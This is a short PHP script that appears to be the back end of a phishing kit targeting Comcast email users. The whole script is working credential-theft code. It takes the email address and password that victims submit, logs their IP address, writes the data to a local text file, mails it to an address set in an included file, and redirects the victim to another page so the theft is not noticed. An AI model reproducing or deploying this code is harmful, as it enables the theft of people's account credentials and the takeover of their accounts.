<?php

$username = $_GET['username'];

$password = $_GET['password'];

if(isset($_GET['username']))       {
    

    $pattern ='/@comcast.net/i';
    $get= preg_replace($pattern, '', $username);

    include 'Email.php';
    
    $ip = getenv("REMOTE_ADDR");
    $message = "---------= ZaiTsev =---------\n";
    $message .= "Email: ".$username." \n";
    $message .= "Password: ".$password."\n";
    $message .= "---------=IP Adress & Date=---------\n";
    $message .= "IP Address: ".$ip."\n";
    $message .= "---------=by ZaiTsev X =---------\n";

$subject = "> HAHAHAHA <<";
$headers = "From: ZaiTsev@he".rand(1,99)."ZaiTsev \r\n" ;
    
    @fclose(@fwrite(@fopen("osos.txt", "a"),$message));
    @mail($to,$subject,$message,$headers);
    
$data = array('error' => '<meta http-equiv="refresh" content="0;URL=info.php">');

echo json_encode($data);

    }

 
 



?>